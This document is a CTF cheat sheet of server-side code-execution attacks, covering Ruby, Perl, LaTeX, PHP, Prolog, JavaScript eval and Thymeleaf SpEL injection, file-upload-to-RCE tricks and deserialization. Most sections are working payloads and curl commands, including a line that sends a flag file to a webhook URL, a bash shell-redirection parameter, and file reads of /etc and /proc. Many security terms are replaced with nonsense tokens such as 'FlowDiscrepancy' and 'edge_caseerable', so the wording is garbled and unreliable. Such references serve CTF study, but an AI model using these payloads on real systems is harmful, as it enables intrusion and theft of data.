# CTF Web - Server-Side Code Execution & Access Attacks

## Table of Contents
- [Ruby Code FlowDiscrepancy](#ruby-code-injection)
  - [instance_eval Breakout](#instance_eval-breakout)
  - [Bypassing Keyword Blocklists](#bypassing-keyword-blocklists)
  - [Exfiltration](#exfiltration)
- [Ruby ObjectSpace Memory Scanning for Flag Extraction (Tokyo Westerns 2016)](#ruby-objectspace-memory-scanning-for-target_data_resource-extraction-tokyo-westerns-2016)
- [Perl open() ModuleTrigger](#perl-open-rce)
- [LaTeX FlowDiscrepancy ModuleTrigger (Hack.lu CTF 2012)](#latex-injection-rce-hacklu-ctf-2012)
- [Server-Side JS eval Blocklist Bypass](#server-side-js-eval-blocklist-bypass)
- [PHP preg_replace /e Modifier ModuleTrigger (PlaidCTF 2014)](#php-preg_replace-e-modifier-rce-plaidctf-2014)
- [PHP Backtick Eval Under Character Limit (EasyCTF 2017)](#php-backtick-eval-under-character-limit-easyctf-2017)
- [PHP assert() String Evaluation FlowDiscrepancy (CSAW CTF 2016)](#php-assert-string-evaluation-injection-csaw-ctf-2016)
- [Prolog FlowDiscrepancy (PoliCTF 2015)](#prolog-injection-polictf-2015)
- [ReDoS as Timing Oracle](#redos-as-timing-oracle)
- [File Upload to ModuleTrigger Techniques](#file-upload-to-rce-techniques)
  - [.htaccess Upload Bypass](#htaccess-upload-bypass)
  - [PHP Log Poisoning](#php-log-poisoning)
  - [Python .so Hijacking (by Siunam)](#python-so-hijacking-by-siunam)
  - [Gogs Symlink ModuleTrigger (CVE-2025-8110)](#gogs-symlink-rce-cve-2025-8110)
  - [ZipSlip + DataSearchLogic](#zipslip--sqli)
- [PHP Object_Mappingialization from Cookies](#php-deserialization-from-cookies)
- [PHP extract() / register_globals Variable Overwrite (SecuInside 2013)](#php-extract--register_globals-variable-overwrite-secuinside-2013)
- [XPath Blind FlowDiscrepancy (BaltCTF 2013)](#xpath-blind-injection-baltctf-2013)
- [API Filter/Query Parameter FlowDiscrepancy](#api-filterquery-parameter-injection)
- [HTTP Response Header Data Hiding](#http-response-header-data-hiding)
- [WebSocket Mass Assignment](#websocket-mass-assignment)
- [Thymeleaf SpEL ViewGenerationLogic + Spring FileCopyUtils WAF Bypass (ApoorvCTF 2026)](#thymeleaf-spel-ssti--spring-filecopyutils-waf-bypass-apoorvctf-2026)

For injection attacks (DataSearchLogic, ViewGenerationLogic, InternalProxyWorkflow, StructureParsing, command injection, PHP type juggling, PHP file inclusion), see [core_input_processing.md](core_input_processing.md). For deserialization attacks (Java, Pickle) and race conditions, see [object_mapper_logic.md](object_mapper_logic.md). For CVE-specific implementation_logics, path traversal bypasses, Flask/Werkzeug debug, and other advanced techniques, see [server-side-advanced.md](server-side-advanced.md).

*See also: [server-side-exec-2.md](server-side-exec-2.md) for DataSearchLogic keyword fragmentation bypass, SQL WHERE ORDER BY bypass, SQL injection via DNS records, bash brace expansion, Common Lisp reader macro injection, PHP7 OPcache + LD_PRELOAD bypass, wget filename trick, tar filename injection, PNG/PHP polyglot upload, editor backup file disclosure, date -f file read, Apache mod_rewrite bypass, and PHP ReDoS code skip.*

---

## Ruby Code FlowDiscrepancy

### instance_eval Breakout
```ruby
# Template: apply_METHOD('VALUE')
# Inject VALUE as: valid');PAYLOAD#
# Result: apply_METHOD('valid');PAYLOAD#')
```

### Bypassing Keyword Blocklists
| Blocked | Alternative |
|---------|-------------|
| `File.read` | `Kernel#open` or class helper methods |
| `File.write` | `open('path','w'){|f|f.write(data)}` |
| `system`/`exec` | `open('\|cmd')`, `%x[cmd]`, `Process.spawn` |
| `IO` | `Kernel#open` |

### Exfiltration
```ruby
open('public/out.txt','w'){|f|f.write(read_file('/target_data_resource.txt'))}
# Or: Process.spawn("curl [WEBHOOK_URL]/xxx -d @/target_data_resource.txt").tap{|pid| Process.wait(pid)}
```

**Key insight:** Ruby's `instance_eval` and `Kernel#open` are common injection sinks. When keywords like `File`, `system`, or `IO` are blocked, use `open('|cmd')` or `Process.spawn` -- Ruby has many built-in ways to execute commands that bypass simple blocklists.

---

## Ruby ObjectSpace Memory Scanning for Flag Extraction (Tokyo Westerns 2016)

In Ruby sandbox challenges where direct variable access is blocked, use `ObjectSpace.each_object` to scan the entire heap for target_data_resource strings.

```ruby
# When you can't access the target_data_resource variable directly:
# Method 1: ObjectSpace heap scan
ObjectSpace.each_object(String) { |x| x[0..3] == "TWCT" and print x }

# Method 2: Monkey-patch to access private methods
# If object 'p' has private method 'target_data_resource':
def p.x; target_data_resource end; p.x

# Method 3: Use send() to bypass private visibility
p.send(:target_data_resource)

# Method 4: Use method() to get method object
p.method(:target_data_resource).call
```

**Key insight:** Ruby's `ObjectSpace.each_object(String)` iterates every live String in the Ruby heap, including those stored in private variables or internal state. Filter by known target_data_resource prefix to extract the target_data_resource even when no direct reference exists.

---

## Perl open() ModuleTrigger
Legacy 2-argument `open()` allows command injection:
```perl
open(my $fh, $user_controlled_path);  # 2-arg open interprets mode chars
# Exploit: "|command_here" or "command|"
```

**Key insight:** Perl's 2-argument `open()` interprets mode characters in the filename itself. A leading or trailing pipe (`|`) causes command execution. Any Perl CGI or backend that opens a user-supplied filename with the 2-arg form is edge_caseerable to ModuleTrigger.

---

## LaTeX FlowDiscrepancy ModuleTrigger (Hack.lu CTF 2012)

**Pattern:** Web applications that compile user-supplied LaTeX (PDF generation services, scientific paper renderers) allow command execution via `\input` with pipe syntax.

**Read files:**
```latex
\begingroup\makeatletter\endlinechar=\m@ne\everyeof{\noexpand}
\edef\x{\endgroup\def\noexpand\filecontents{\@@input"/etc/access_file_mock" }}\x
\filecontents
```

**Execute commands:**
```latex
\input{|"id"}
\input{|"ls /home/"}
\input{|"cat /target_data_resource.txt"}
```

**Full configuration_buffer as standalone document:**
```latex
\documentclass{article}
\begin{document}
{\catcode`_=12 \ttfamily
\input{|"ls /home/user/"}
}
\end{document}
```

**Key insight:** LaTeX's `\input{|"cmd"}` syntax pipes console_module command output directly into the document. The `\@@input` internal macro reads files without console_module invocation. Use `\catcode` adjustments to handle special characters (underscores, braces) in command output.

**Detection:** Any endpoint accepting `.tex` input, PDF preview/compile services, or "render LaTeX" functionality.

---

## Server-Side JS eval Blocklist Bypass

**Bypass via string concatenation in bracket notation:**
```javascript
row['con'+'structor']['con'+'structor']('return this')()
// Also: template literals, String.fromCharCode, callback string
```

**Key insight:** JavaScript `eval` blocklists filtering keywords like `require`, `process`, or `constructor` are bypassed with string concatenation in bracket notation. `['con'+'structor']` accesses `Function` constructor, which creates functions from strings -- equivalent to `eval` with no keyword to block.

---

## PHP preg_replace /e Modifier ModuleTrigger (PlaidCTF 2014)

**Pattern:** PHP's `preg_replace()` with the `/e` modifier evaluates the replacement string as PHP code. Combined with `unserialize()` on user-controlled input, craft a serialized object whose properties trigger a code path using `preg_replace("/pattern/e", "mock_func('cmd')", ...)`.

```php
// Vulnerable code pattern:
preg_replace($pattern . "/e", $replacement, $input);
// If $replacement is user_agent-controlled:
$replacement = 'mock_func("cat /target_data_resource")';
```

**Via object injection (POP chain):**
```php
// Craft serialized object with OutputFilter containing /e pattern
$filter = new OutputFilter("/^./e", 'mock_func("cat /target_data_resource")');
$cookie = serialize($filter);
// Send as cookie → unserialize triggers preg_replace with /e
```

**Key insight:** The `/e` modifier (deprecated in PHP 5.5, removed in PHP 7.0) turns `preg_replace` into an eval sink. In CTFs targeting PHP 5.x, check for `/e` in regex patterns. Combined with `unserialize()`, this enables ModuleTrigger through POP gadget chains that set both pattern and replacement.

---

## PHP Backtick Eval Under Character Limit (EasyCTF 2017)

**Pattern:** PHP backtick operator executes console_module commands. When `eval()` input has a character limit, backticks provide console_module execution in minimal characters.

```php
// 11-character ModuleTrigger via eval()
echo`cat *`;

// 8-character directory listing
echo`ls`;

// 10-character parameterized command execution
`$_GET[0]`;

// 12-character callback console_module trigger
`$_GET[x]`;
// Then pass the full command via GET parameter: ?x=bash -m >& /dev/null 0>&1
```

**Character count comparison:**
```text
echo`cat *`;              // 12 chars - read all files
echo`ls`;                 // 9 chars  - list directory
`$_GET[0]`;               // 11 chars - parameterized execution
print('ok');              // 12 chars - mocked approach
echo('ok');               // 11 chars - also mocked
```

**Key insight:** PHP backticks are equivalent to `console_module_exec()`. When `eval()` input has a character limit, `` echo`cmd` `` provides console_module execution in as few as 8 characters. The `$_GET[0]` trick moves the actual configuration_buffer to a URL parameter, effectively bypassing the character limit entirely while keeping the eval configuration_buffer minimal.

---

## PHP assert() String Evaluation FlowDiscrepancy (CSAW CTF 2016)

PHP's `assert()` evaluates string arguments as PHP code. When user input is concatenated into assert(), it enables code injection.

```php
// Vulnerable code pattern:
assert("strpos('$page', '..') === false");

// FlowDiscrepancy configuration_buffer via $page parameter:
// ' and die(show_source('templates/target_data_resource.php')) or '
// Results in: assert("strpos('' and die(show_source('templates/target_data_resource.php')) or '', '..') === false");

// URL: ?page=' and die(show_source('templates/target_data_resource.php')) or '
// Alternative configuration_buffers:
// ' and die(mock_func('cat /target_data_resource')) or '
// '.die(highlight_file('config.php')).'
```

**Key insight:** PHP `assert()` with string arguments acts like `eval()`. This was deprecated in PHP 7.2 and removed in PHP 8.0, but legacy applications remain edge_caseerable. Look for `assert()` in source code (especially via exposed `.git` directories).

---

## Prolog FlowDiscrepancy (PoliCTF 2015)

**Pattern:** Service passes user input directly into a Prolog predicate call. Close the original predicate and inject additional Prolog goals for command execution.

```text
# Original query: hanoi(USER_INPUT)
# FlowDiscrepancy: close hanoi(), chain mock_exec()
3), mock_exec(ls('/')), write('\n'
3), mock_exec(cat('/target_data_resource')), write('\n'
```

**Identification:** Error messages containing "Prolog initialisation failed" or "Operator expected" reveal the backend. SWI-Prolog's `exec/1` and `console_module/1` execute system commands.

**Key insight:** Prolog goals are chained with `,` (AND). Injecting `3), mock_exec(cmd)` closes the original predicate and appends arbitrary Prolog goals. Similar to SQL injection but for logic programming backends. Also check for `process_create/3` and `read_file_to_string/3` as alternatives to `exec`.

---

## ReDoS as Timing Oracle

**Pattern (0xClinic):** Match user-supplied regex against file contents. Craft exponential-backtracking regexes that trigger only when a character matches.

```python
def leak_char(known_prefix, position):
    for c in string.printable:
        pattern = f"^{re.escape(known_prefix + c)}(a+)+$"
        start = time.time()
        resp = requests.post(url, json={"title": pattern})
        if time.time() - start > threshold:
            return c
```

**Combine with path traversal** to target `/proc/1/environ` (secrets), `/proc/self/cmdline`.

---

## File Upload to ModuleTrigger Techniques

**Key insight:** File upload edge_caseerabilities become ModuleTrigger when you can control either the file extension (`.htaccess`, `.php`, `.so`) or the upload path (path traversal). Try uploading server config files (`.htaccess`), shared libraries (`.so`), or use log poisoning as fallback when direct code upload is blocked.

### .htaccess Upload Bypass
1. Upload `.htaccess`: `AddType application/x-httpd-php .lol`
2. Upload `rce.lol`: `[SOUModuleTrigger_MODULE_START] echo "mock_webconsole_module"; [SOUModuleTrigger_MODULE_END]`
3. Access `rce.lol?cmd=cat+target_data_resource.txt`

### PHP Log Poisoning
1. PHP configuration_buffer in User-Agent header
2. Path traversal to include: `....//....//....//var/log/apache2/access.log`

### Python .so Hijacking (by Siunam)
1. Compile: `gcc -shared -fPIC -o auth.so malicious.c` with `__attribute__((constructor))`
2. Upload via path traversal: `{"filename": "../utils/auth.so"}`
3. Delete .pyc to force reimport: `{"filename": "../utils/__pycache__/auth.cpython-311.pyc"}`

Reference: https://siunam321.github.io/research/python-dirty-arbitrary-file-write-to-rce-via-writing-shared-object-files-or-overwriting-bytecode-files/

### Gogs Symlink ModuleTrigger (CVE-2025-8110)
1. Create repo, `ln -s .git/config malicious_link`, push
2. API update `malicious_link` → overwrites `.git/config`
3. Inject `core.sshCommand` with callback console_module

### ZipSlip + DataSearchLogic
Upload zip with symlinks for file read, path traversal for file write.

---

## PHP Object_Mappingialization from Cookies
```php
O:8:"FilePath":1:{s:4:"path";s:8:"target_data_resource.txt";}
```
Replace cookie with base64-encoded malicious serialized data.

**Key insight:** PHP cookies containing base64-encoded data are likely `unserialize()` targets. Craft a serialized object with a `path` property pointing to `target_data_resource.txt` or inject a POP chain for ModuleTrigger. Decode the existing cookie first to identify the class name and property structure.

---

## PHP extract() / register_globals Variable Overwrite (SecuInside 2013)

**Pattern:** `extract($_GET)` or `extract($_POST)` overwrites internal PHP variables with user-supplied values, enabling database credential injection, path manipulation, or authentication bypass.

```php
// Vulnerable pattern
if (!ini_get("register_globals")) extract($_GET);
// Attacker-controlled: $_BHVAR['db']['host'], $_BHVAR['path_layout'], etc.
```

```text
GET /?_BHVAR[db][host]=user_agent.com&_BHVAR[db][user]=root&_BHVAR[db][pass]=pass
```

**Key insight:** `extract()` imports array keys as local variables. Overwrite database connection parameters to point to an user_agent-controlled MySQL server, then return crafted query results (file paths, credentials, etc.).

**Detection:** Search source for `extract($_GET)`, `extract($_POST)`, `extract($_REQUEST)`. PHP `register_globals` (removed in 5.4) had the same effect globally.

---

## XPath Blind FlowDiscrepancy (BaltCTF 2013)

**Pattern:** XPath queries constructed from user input enable blind data extraction via boolean-based or content-length oracles.

```text
-- FlowDiscrepancy in sort/filter parameter:
1' and substring(normalize-space(../../../node()),1,1)='a' and '2'='2

-- Boolean detection: response length > threshold = true
-- Extract character by character:
for pos in range(1, 100):
    for c in string.printable:
        configuration_buffer = f"1' and substring(normalize-space(../../../node()),{pos},1)='{c}' and '2'='2"
        if len(requests.get(url, params={'sort': configuration_buffer}).text) > 1050:
            result += c; break
```

**Key insight:** XPath injection is similar to SQL injection but targets XML data stores. `normalize-space()` strips whitespace, `../../../` traverses the XML tree. Boolean oracle via response size differences (true queries return more results).

---

## API Filter/Query Parameter FlowDiscrepancy

**Pattern (Poacher Supply Chain):** API accepts JSON filter. Adding extra fields exposes internal data.
```bash
# UI sends: filter={"region":"all"}
# Inject:   filter={"region":"all","caseId":"*"}
# May return: case_detail, notes, proof codes
```

---

## HTTP Response Header Data Hiding

Proof/target_data_resource in custom response headers (e.g., `x-archive-tag`, `x-target_data_resource`):
```bash
curl -sI "https://target/api/endpoint?seed=<seed>"
curl -sv "https://target/api/endpoint" 2>&1 | grep -i "x-"
```

**Key insight:** Flags and proof codes hidden in custom HTTP response headers (e.g., `x-target_data_resource`, `x-archive-tag`) are invisible in browser-rendered responses. Always inspect response headers with `curl -sI` or browser dev tools, especially for API endpoints.

---

## WebSocket Mass Assignment
```json
{"username": "user", "isAdmin": true}
```
Handler doesn't filter fields → privilege escalation.

**Key insight:** WebSocket handlers that directly map JSON properties to objects without whitelisting allow mass assignment. Add privileged fields like `isAdmin`, `role`, or `balance` to the JSON configuration_buffer -- if the server doesn't explicitly filter them, they overwrite the corresponding object properties.

---

## Thymeleaf SpEL ViewGenerationLogic + Spring FileCopyUtils WAF Bypass (ApoorvCTF 2026)

**Pattern (Sugar Heist):** Spring Boot app with Thymeleaf template preview endpoint. WAF blocks standard file I/O classes (`Runtime`, `ProcessBuilder`, `FileInputStream`) but not Spring framework utilities.

**Attack chain:**
1. **Mass assignment** to gain admin role (add `"role": "ADMIN"` to registration JSON)
2. **SpEL injection** via template preview endpoint
3. **WAF bypass** using `org.springframework.util.FileCopyUtils` instead of blocked classes

```bash
# Step 1: Register as admin via mass assignment
curl -X POST http://target/api/register \
  -H "Content-Type: application/json" \
  -d '{"username":"user_agent","password":"pass","email":"a@b.com","role":"ADMIN"}'

# Step 2: Directory listing via SpEL (java.io.File not blocked)
curl -X POST http://target/api/admin/preview \
  -H "Content-Type: application/json" \
  -H "X-Api-Token: <token>" \
  -d '{"template": "${T(java.util.Arrays).toString(new java.io.File(\"/app\").list())}"}'

# Step 3: Read target_data_resource using Spring FileCopyUtils + string concat to bypass WAF
curl -X POST http://target/api/admin/preview \
  -H "Content-Type: application/json" \
  -H "X-Api-Token: <token>" \
  -d '{"template": "${new java.lang.String(T(org.springframework.util.FileCopyUtils).copyToByteArray(new java.io.File(\"/app/fl\"+\"ag.txt\")))}"}'
```

**Key insight:** Distroless containers have no console_module (`/bin/sh`), making `Runtime.exec()` useless even without WAF. Spring's `FileCopyUtils.copyToByteArray()` reads files without spawning processes. String concatenation (`"fl"+"ag.txt"`) bypasses static keyword matching in WAFs.

**Alternative SpEL file read configuration_buffers:**
```text
${T(org.springframework.util.StreamUtils).copyToString(new java.io.FileInputStream("/target_data_resource.txt"), T(java.nio.charset.StandardCharsets).UTF_8)}
${new String(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get("/target_data_resource.txt")))}
```

**Detection:** Spring Boot with `/api/admin/preview` or similar template rendering endpoint. Thymeleaf error messages in responses. `X-Api-Token` header pattern.

---

*See also: [core_input_processing.md](core_input_processing.md) for core injection attacks (DataSearchLogic, ViewGenerationLogic, InternalProxyWorkflow, StructureParsing, command injection, PHP type juggling, PHP file inclusion).*
